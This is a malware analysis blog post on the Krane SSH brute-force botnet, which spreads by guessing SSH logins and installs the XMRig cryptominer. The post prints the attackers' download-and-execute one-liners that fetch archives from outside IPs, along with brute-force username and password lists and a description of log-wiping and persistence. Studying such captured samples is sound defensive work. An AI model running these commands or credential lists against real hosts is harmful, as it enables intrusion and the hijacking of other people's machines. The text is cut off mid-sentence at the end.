    "plain_text": "# New Threat Alert: Krane Malware\n\n**cujo.com/threat-alert-krane-malware/**\n\n\nNovember 12, 2021\n\n\n-----\n\nAll posts\nNovember 12, 2021\n\nOne of our [honeypots has recently captured an interesting attack that we have not seen before. In this article, we will go through](https://cujo.com/honeypot-journals-credential-attacks/)\nthe peculiarities of the malware and detail the findings in a technical analysis.\n\n[Catching something truly unique in the wild forest of the IoT threat landscape has not been a common event in 2021, since most](https://cujo.com/top-iot-security-threats-iot-chronicle-june/)\nof the attacks are [descendants of Mirai and Gafgyt malware. We also recommend reading our Honeypot Journals II: Attacks on](https://cujo.com/mirai-gafgyt-with-new-ddos-modules-discovered/)\nResidential Endpoints a more broader overview of attacker tactics.\n\nThe malware specimen we spotted not only has common capabilities like brute-force login prompts and the ability to deploy the\nXMRig cryptominer application to mine Monero for the attackers, but it also has an interesting combination of Bash and Python\nscripts to propagate and move laterally to infect vulnerable hosts.\n\nOverall, the malware has the following features:\n\nBrute-forces credentials to enter SSH\nBuilt-in password dictionary\n\n\n-----\n\nUses curl and wget to grab second stage payloads\nSets up persistence and cleans up logs to cover its tracks\nChecks for competing botnets and cryptominers, kills their processes\nDeploys XMRig cryptominer\nUses Bash scripts and a Python script to further propagate to vulnerable hosts\nIncludes a subnet scanner and a banner grabber module\n\n## The Initial Vector of the Krane Malware\n\nThe initial vector of entry was a brute-forced SSH login. Our sensor had flagged the attempt and we tried to find similar events or\nevents from the same source.\n\nWe saw that the following IP addresses were carrying out brute-force attempts in this campaign:\n\n**IP** **rDNS**\n\n198.98.52[.]12 No rDNS entry.\n\n199.19.226[.]4 kk[.]ko\n\n199.195.252[.]242 No rDNS entry.\n\n209.141.40[.]193 smtp21.dsfdsaonline[.]com\n\n209.141.47[.]39 chenximiao[.]ml\n\n209.141.55[.]247 No rDNS entry.\n\n209.141.51[.]168 soen390.alan[.]ly\n\nAll of these IP addresses belong to AS53667.\n\nAS53667, or PONYNET, has been known to be a malware distribution center for some time now. PONYNET is owned by\nFrantech Solutions, a so-called bulletproof hosting service provider. Bulletproof hosting providers allow their customers\nconsiderable leniency in the types of material they upload and distribute from hosted servers, whether it be phishing campaigns,\nmalicious botnets, or other illegal activities.\n\nThe firm BuyVM (also owned by Frantech Solutions) has datacenters in the US and originate most of the attacks noted above.\n\n\n-----\n\n[https://urlhaus.abuse.ch/asn/53667/](https://urlhaus.abuse.ch/asn/53667/)\n\nWe observed the following usernames being used in the SSH break-in events:\n\n**Usernames**\n\nGit\n\nWeb\n\nCisco\n\nTomcat\n\nSteam\n\nChia\n\nHyjx\n\nEs\n\nAzureuser\n\nOnce the malware gains access with valid credentials, it will attempt to deploy a downloader script, which tries to pull the second\nstage payload from a hardcoded location.\n```\ncd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56[.]65/krax || curl -o krax 198.98.56.65/krax; tar xvf\nkrax; cd ._lul; chmod +x *; ./krn; ./krane [email protected]\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 209.141.57[.]111/ssh || curl -o ssh 209.141.57.111/ssh; tar\nxvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane [email protected]\n\n```\n\n-----\n\n```\n    p || || || || g [ ] ||\nxvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane Root12345\n\n```\nThe three highlighted servers had been the main distributors of Krane, but, over the following weeks, many others have started to\npropagate the Krane malware:\n\n**# Count** **Distribution server**\n\n68 198.98.56[.]65/krax\n\n50 209.141.57[.]111/ssh\n\n36 209.141.32[.]157/ssh\n\n11 209.141.32[.]204/ssh\n\n7 209.141.54[.]197/ssh\n\n4 209.141.58[.]203/ssh\n\nThe last argument in the Bash downloader script looks to be a password that is passed to the krane file (see the Second Payload\nsection for more info on the krane file). We have seen the following passwords used:\n\n**Passwords**\n\nuser\n\nhduser\n\nTest1234\n\n[[email protected]](https://cujo.com/cdn-cgi/l/email-protection)\n\n[[email protected]](https://cujo.com/cdn-cgi/l/email-protection)\n\nTest1236\n\ntest12346\n\nTest12346\n\nnagios6\n\noracle6\n\nPostgres1236\n\ntraacerlab6\n\n1234566\n\n12346\n\nAdmin123456\n\noracle6Z\n\n1234566l\n\nubuntu\n\nadmin\n\nRoot12345\n\nadmin6(\n\n[[email protected]](https://cujo.com/cdn-cgi/l/email-protection)\n\n[[email protected]](https://cujo.com/cdn-cgi/l/email-protection)\n\n\n-----\n\n## Second Stage Payloads\n\nThere were two main packages being pulled via the scripts:\n\nkrax\nssh\n\n## The krax Package\n```\ncd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56[.]65/krax || curl -o krax 198.98.56.65/krax; tar xvf\nkrax; cd ._lul; chmod +x *; ./krn; ./krane [email protected]\n\n```\nThe package called krax consists of a hidden directory called ._lul.\n\nInside the directory, we can see the following files:\n\nconfig.json\nkrn\nkrane\n\n### krane:\n\nThe UID check will, by default, return the value 0 if the current user is root, and, if that is the case, the condition will take the else\nbranch.\n\nOn MacOS, if the script is running via a normal user account, the UID usually has an id of 50x, while on Linux system the UID will\nbe > 1000.\n\n\n-----\n\nThe krane script also does some house-chores:\n\nIt cleans up pre-existing instances of Krane,\nDeletes log files like lastlog, bash_history, messages, utmp and wtmp to hide its activities,\nRe-creates the log files to remove traces of tampering\n\n\n-----\n\nAs we investigated the campaign, we have gathered all variants of this shellscript and made notes of all hardcoded passwords\nused:\n\nThe krane bash script also includes a short Romanian sentence, shedding some light on its creator’s likely whereabouts.\n```\n#descarci scriptu, si il rulezi cu ./script.sh parola_de_la_root\n\n```\nIt means “download the script, and run it with ./script.sh.”\n\n### krn:\n\nThis binary is the executable of the cryptocurrency miner, called XMRig 6.12.1.\n\n[XMRig is a high performance, open source, cross platform RandomX, KawPow, CryptoNight and AstroBWT unified CPU/GPU](https://github.com/xmrig/xmrig/releases)\nminer and RandomX benchmark. It hijacks the user’s computer and uses its resources to mine digital currency.\n\nXMRig has many plugins and supports many types of CPUs and GPU cores, like nVidia CUDA or AMD (OpenCL).\n\n### config.json:\n\nConfig.json is the descriptive file, a configuration set for XMRig to know where to connect to and which crypto pool to use.\n\nKrane uses Hashvault’s pool, like many other cryptocurrency-mining malware:\n\npool.hashvault.pro:80\n\n## The ssh Package\n\nThe other campaign downloads a package file called ssh:\n```\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 209.141.32[.]157/ssh || curl -o ssh 209.141.32.157/ssh; tar\nxvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane Root12345\n\n```\nInside the packed archive file is a hidden directory called .ssh, with two files inside:\n\nkrane\nsshd\n\nThe script file krane is the same as the one described in the krax archive file.\n\n### sshd\n\nThe sshd Bash script is a second-stage downloader script: based on the output of the nproc environmental variable, it will pull\neither the road campaign or the runner campaign.\n\n\n-----\n\nNproc prints the available CPU cores on any given system. However, the condition which determines this is fundamentally flawed:\nnproc is being queried from the $nproc variable, but it is not set on every system by default.\n\nWe found that most Linux systems simply return nothing when $nproc is queried, triggering the else branch of the condition.\n\nLater, we captured a new variant of the downloader script, which not only checks for the available processing units, but also\nchecks whether libssh-4 library is installed on system.\n```\ndpkg –l | grep libssh4\n\n## .road:\n\n```\nA hidden folder .road is created in this campaign, it has five files:\n\na\nb\nconfig.json\nkrane\nrun\n\n### “a” script file\n\nThis script file’s purpose is to kill:\n\n\n-----\n\nrunning instances of Krane,\nother instances of XMRig,\nthe [Sysrv botnet,](https://cujo.com/the-sysrv-botnet-and-how-it-evolved/)\nthe cryptojacker [Watchdog.](https://unit42.paloaltonetworks.com/watchdog-cryptojacking/)\n\n### “b” script file\n```\nnohup watch -n 3 sh /tmp/.ssh/a &\n\n```\n_nohup is a POSIX command which means “no hang up”. Its purpose is to execute a command that ignores the HUP (hangup)_\nsignal and therefore does not stop when the user logs out. Output that would normally go to the terminal goes to a file called\nnohup.\n\nThe file being executed and watched is the “a” script file, which kills competing cryptominers and any earlier instances of XMRig\nor Krane.\n\n### config.json\n\nThe XMRig configuration file that stores the pool, password, and wallet information.\n\n\n-----\n\n### run\n\nThis binary is the executable of the cryptocurrency miner, called XMRig 6.12.1.\n\n### krane\n\nThe krane script file used here is the same that was described in the Krax campaign. Based on the current user’s privilege level, a\nnew, hardcoded password is set for the user account.\n\nAgain, Krane will try and clear log files by deleting and re-creating them from scratch with the touch command.\n\nTowards the end of the script file, a nohup command is called to execute the “b” script file. Now remember, the “b” script file calls\nthe “a” script file, which will kill competing botnets and already running instances of XMRig and Krane.\n\n\n-----\n\n## .runner:\n\nWe just took apart the road campaign, now let’s focus on the runner campaign.\n\nThis campaign consists of a hidden directory called runner with many files:\n\n\n-----\n\na\nboner\nclase.txt\ncosynus\nk_config.json\nmain\nnope\npassfile.txt\npscan2\nrun\nsend_vuln.py\nyes\n\n### a\n\nIn this script, based on the output of UID environmental variable, either the script file nope is executed with the clase.txt file\nargument or the script file yes is executed.\n\nLet’s investigate further the contents of these files.\n\n### clase.txt\n\nThis file consists of /16 subnets, more precisely, 1061 subnets with two octets. This file might be used for scanning certain\nsubnets, but we first need to also investigate the nope file.\n\n100.20\n100.24\n103.21\n103.246\n103.4\n103.8\n104.153\n104.200\n104.255\n106.186\n107.150\n107.20\n107.23\n108.128\n108.166\n108.175\n…\n…\n…\n\n### nope:\n\nThis script pulls two resources from ro4drunner[.]com:\n\n$File is the password file, gets written to passfile.txt\n$File2 holds the subnets to scan, gets written to clase.txt\n\n\n-----\n\nAfter that, a random IP subnet is generated by using the value gained from /proc/sys/kernel/random/uuid and gets scanned for\nopen TCP port 22.\n\nThe script will then launch the boner executable, which is a banner grabber program, and grabs the banner response from TCP\nport 22 from all subnets listed in the mfu.txt file.\n\nThe generated banner.log file consists of active IPs with the open TCP port 22. This list is narrowed down to only include hosts\nwith SSH-2.0-OpenSSH protocol information. The output is piped into a file called ipuri, which is used as input by the main\nexecutable.\n\nThe main executable will launch the original SSH brute-force attack against the active hosts, and the attack chain starts from the\nbeginning.\n\n### yes:\n\nThe yes script file is almost identical to the nope script file, with a few modifications. It seems to be a second, re-thought script that\nadds some improvements to the first one:\n\n**fs.file-max is set to a higher value than default. You can increase the maximum number of open files on the Linux host by**\nsetting this value in the kernel variable file, /proc/sys/fs/file-max\n**ulimits are set to 99999. ulimit is used to monitor, set, or limit the resource usage of the current user. It is used to return the**\nnumber of open file descriptors for each process. It is also used to set restrictions on the resources used by a process.\n\n\n-----\n\n### passfile.txt:\n\nThis file is used for the propagation and brute-force logins on SSH ports. The list consists mostly of default login passwords and\napplication-specific root passwords.\n\n**Usernames** **Passwords**\n\ntracerlab tracerlab\n\nroot 123456\n\nroot [[email protected]](https://cujo.com/cdn-cgi/l/email-protection)\n\nadmin admin\n\nadmin 123456\n\nroot root\n\nroot [[email protected]](https://cujo.com/cdn-cgi/l/email-protection)\n\ntest test\n\n\n-----\n\noracle oracle\n\nes es\n\nansible ansible\n\nroot 1\n\nroot 123\n\na1234 123456\n\nubuntu 123456\n\nroot 1234\n\nubuntu ubuntu\n\npostgres postgres\n\nminecraft minecraft\n\ntestuser testuser\n\nodoo12 odoo12\n\nmcserver mcserver\n\nhadoop hadoop\n\ntracerlab 123456\n\nminecraft 123456\n\ntest 123456\n\ntest [[email protected]](https://cujo.com/cdn-cgi/l/email-protection)\n\nmysql mysql\n\nwww www\n\nadmin Admin123\n\nroot Root123\n\nroot Root1234\n\nroot Root123456\n\nadmin Admin1234\n\nroot Root1\n\nroot root123\n\nroot root1234\n\nroot Admin1234\n\nroot admin1234\n\nroot Ubuntu123\n\nroot Ubuntu1\n\nroot Postgres1\n\nroot Postgres1234\n\nroot Postgres123\n\n\n-----\n\npostgres 123456\n\noracle 123456\n\nroot Test123\n\nroot Test1234\n\ntest Test123\n\ntest Test1234\n\ntest test123\n\ntest test1234\n\nroot test123\n\nroot test1234\n\n### run:\n\nThe run script file checks whether any of the four binaries are running already: if not, it will proceed and execute the send_vuln.py\nPython script.\n\n### send_vuln.py:\n\nThe send_vuln.py file calls the k_config.json file and parses it. The IP address and port found in that JSON file will serve as the\nC2 server to which the results – the list of vulnerable hosts – are sent to.\n\n\n-----\n\nThe list of vulnerable hosts is temporarily stored in a prinse.txt file.\n\n### k_config.json:\n\nThis file holds the IP address and port number of the C2 server to which the list of vulnerable hosts is sent. Reports are sent every\n15 seconds.\n\n\n-----\n\n### boner:\n\nThis executable binary is a simple banner grabber. It knocks on all IP addresses found in the listfile and grabs their respective\nbanner from the specified port. There is also an option to use more threads to speed up the program.\n```\nusage: %s <infile> <port> <threads>\n\n### cosynus:\n\n```\nThe cosynus binary is a simple SYN port scanner. There is an option to set the speed, target port number and IP class.\n\nusage: ./cosynus <port> [-a <a class> | -b <b class>] [-i <interface] [-s <speed>]\n\n_speed 10 -> as fast as possible, 1 -> will take ages (about 50 syns/s)_\n\n\n-----\n\n### main:\n\nThe main executable is the first element in the attack chain. This binary is the one that starts the SSH brute-force based on the\n_ipuri file (it is used for the input parameter). After a successful login to a vulnerable host, main makes sure to download either the_\n\nkrax\nssh\nroad\nrunner\n\narchive packages to the target machine and starts the whole infection chain.\n\nAgain, we have spotted several Romanian sentences in the executable, shedding some light on the nationality of the developer.\n\n[IPuri Ramase]\nAcu ti-l urc\nnu se mai poate face sessiuni, meci mai rorst\nBv mane l-ai loat an gurtza\nmna, pe asta ti-o mai rezolva pula mea\n\n### pscan2:\n\nPscan2 is a simple TCP port scanner. It produces results in a file called scan.log.\n\nUsage: %s <b-block> <port> [c-block]\n\n## Cryptomining\n\nWe can get a clear picture about the actor’s mining operation by looking up the respective wallets on Hashvault: so far, we saw\nthree wallets that are used and distributed between campaigns.\n\nThe three wallets:\n\n49PGW8Cg8yj4oFktr5Au5zjUHkagMusKxctQGdJ6MNkD3TZYGsAbEEAc31QSfPjdJ14ME36hdAmJRPVaeiNB2K4nGPsenv6\n\n\n-----\n\nAt one point, the two workers had 70 miners (infections) in total.\n\n46p7Typ6JQk7WpWyyE3J62M5bh39yygDm6rNYB4cowZPiiCjm2wQ8YFTum6ii2DZAePgpcz8zKMamfLX1EjDHJwvCWEZ6VW\n\n\n-----\n\nThe CPP worker had 29 miners at one point.\n\n46yvASpNp25BeTXJB9Zd18K4b7LWcYGZ2HYopYF6TNfCNWJQc2xMJb5dow7SucAYPu1eAui54mf3AFifzYvfAbF35kFaXJb\n\n\n-----\n\nHere, we have observed more than 200 miners (active infections) at a single point.\n\nIf we add up the balance of the three unique wallets, the total value mined was:\n\n2053.82 EUR\n355.38 EUR\n25.06 EUR\nIn total: 2434.26 EUR\n\nMost mature malware campaigns gain much larger amounts over their lifetime, but, considering that Krane showed development\nover the past months, we expect more infections to happen at later stages as the malware matures forward.\n\n## OSINT on the Krane Botnet\n\nThere has not been much mention of this malware family in the infosec community. The only worthwhile mention is a Twitter post\nby user @Dogeiana from the 29 of July.th\n\nThe poster described a direct interaction between the operator and him when the attacker deployed the cryptominer onto the\nvictim’s honeypot system.\n\n[https://twitter.com/Dogeiana/status/1420850937577476103](https://twitter.com/Dogeiana/status/1420850937577476103)\n\n## Coverage\n\n[The malicious
